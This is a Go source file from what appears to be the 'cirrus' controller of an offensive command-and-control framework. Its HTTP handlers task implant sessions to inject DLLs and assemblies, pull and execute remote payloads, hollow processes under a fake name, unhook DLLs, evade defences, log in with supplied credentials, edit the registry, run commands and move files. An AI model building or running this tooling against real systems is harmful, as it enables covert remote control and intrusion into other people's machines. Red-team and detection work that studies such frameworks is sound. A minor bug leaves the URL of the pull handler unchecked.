// Copyright (C) 2020 - 2022 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package cirrus

import (
	"context"
	"net/http"
	"strconv"
	"strings"

	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2/task"
)

func (s *sessionManager) httpTaskDLL(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskDLL) {
	if len(t.Data) == 0 && len(t.Path) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "data" or "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Path) > 0 {
		s.watchJob(x, j, "dll "+t.Path+" entry:"+t.Entry)
	} else {
		s.watchJob(x, j, "dll"+hashSum(t.Data)+" entry:"+t.Entry)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPexec(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskPull) {
	if len(t.URL) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.PullExecuteAgent(t.URL, t.Agent, t.Detach != boolTrue, t.Filter))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskPexec(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "pexec "+t.URL+" agent:"+t.Agent)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSpawn(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskSpawn) {
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	n, err := t.Packet(p)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskSpawn(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "spawn "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPower(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskPower) {
	if len(t.Action) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if t.Seconds > 0 {
		s.watchJob(x, j, "power "+strings.ToLower(t.Action)+" "+strconv.FormatUint(uint64(t.Seconds), 10))
	} else {
		s.watchJob(x, j, "power "+strings.ToLower(t.Action))
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskCheck(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskCheck) {
	if len(t.DLL) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "dll" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Function) > 0 {
		s.watchJob(x, j, "check_dll "+t.DLL+":"+t.Function+hashSum(t.Data))
	} else {
		s.watchJob(x, j, "check_dll "+t.DLL+hashSum(t.Data))
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPatch(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskPatch) {
	if len(t.DLL) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "dll" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Function) > 0 {
		s.watchJob(x, j, "patch_dll "+t.DLL+":"+t.Function+hashSum(t.Data))
	} else {
		s.watchJob(x, j, "patch_dll "+t.DLL+hashSum(t.Data))
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskZombie(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskZombie) {
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	if len(t.Fake) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "fake" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "zombie "+t.Fake+hashSum(t.Data)+" entry:"+t.Entry)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystem(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskSystem) {
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.syscall(t.Command, t.Args, t.Filter)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if j == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	if len(t.Args) > 0 {
		s.watchJob(x, j, "system "+t.Command+" "+t.Args)
	} else {
		s.watchJob(x, j, "system "+t.Command)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskNetcat(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskNetcat) {
	if len(t.Host) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "host" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "netcat "+t.Host+"/"+t.Protocol+" "+strconv.FormatUint(uint64(len(t.Data)), 10)+"b"+hashSum(t.Data))
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskWTS(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := wtsPacket(c, a)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskWTS(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskCommand(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskCommand) {
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Stdin) > 0 {
		s.watchJob(x, j, "execute "+t.Command+" stdin"+hashSum(t.Stdin))
	} else {
		s.watchJob(x, j, "execute "+t.Command)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPull(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	var (
		u = c.StringDefault("url", "")
		p = c.StringDefault("path", "")
		a = c.StringDefault("agent", "")
	)
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.PullAgent(u, a, p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskPull(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "pull "+u+" "+p+" agent:"+a)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskMigrate(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskMigrate) {
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	n, err := t.Packet(p)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskMigrate(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "migrate "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskFuncmap(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskFuncmap) {
	if len(t.Action) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "funcmap "+t.Action+" "+t.Function+hashSum(t.Data))
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskEvade(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := evadePacket(a)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskEvade(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskLogin(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	u := c.StringDefault("user", "")
	if len(u) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "user" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var (
		i      = c.BoolDefault("interactive", false)
		p      = c.StringDefault("pass", "")
		d      = c.StringDefault("domain", "")
		j, err = x.s.Task(task.LoginUser(i, u, d, p))
	)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskLogin(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	y := "network"
	if i {
		y = "interactive"
	}
	if len(d) > 0 {
		s.watchJob(x, j, "login_user "+y+" "+u)
	} else {
		s.watchJob(x, j, "login_user "+y+" "+u+"@"+d)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskAssembly(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskAssembly) {
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "asm sha256:"+hashSum(t.Data)+" entry:"+t.Entry)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskUpload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	b, err := c.Bytes("data")
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(task.Upload(p, b))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskUpload(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "upload "+p+hashSum(b))
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskScript(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	q, n := s.script(c.StringDefault("script", ""))
	if q == nil {
		writeError(http.StatusNotFound, msgNoScript, w, r)
		return
	}
	j, err := x.s.Tasklet(q.s)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "script "+n)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskProfile(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(c.StringDefault("profile", ""))
	if len(p) == 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	j, err := x.s.SetProfileBytes(p)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "profile "+p.String())
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskDownload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.Download(p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskDownload(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, "download "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskRegistry(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	var (
		k = c.StringDefault("key", "")
		v = c.StringDefault("value", "")
		a = c.StringDefault("action", "")
	)
	if len(k) == 0 || len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "key" and "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := registryPacket(c, a, k, v)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskRegistry(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystemIo(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := ioPacket(c, a)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskSystemIo(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskWindowUI(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := uiPacket(c, a)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		s.log.Warning(`[cirrus/http] httpTaskWindowUI(): Error tasking Session "%s": %s!`, x.s.ID.String(), err.Error())
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskWorkHours(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskWorkHours) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j,
		"workhours "+t.Days+" "+strconv.FormatUint(uint64(t.StartHour), 10)+":"+strconv.FormatUint(uint64(t.StartMin), 10)+" - "+
			strconv.FormatUint(uint64(t.EndHour), 10)+":"+strconv.FormatUint(uint64(t.EndMin), 10),
	)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
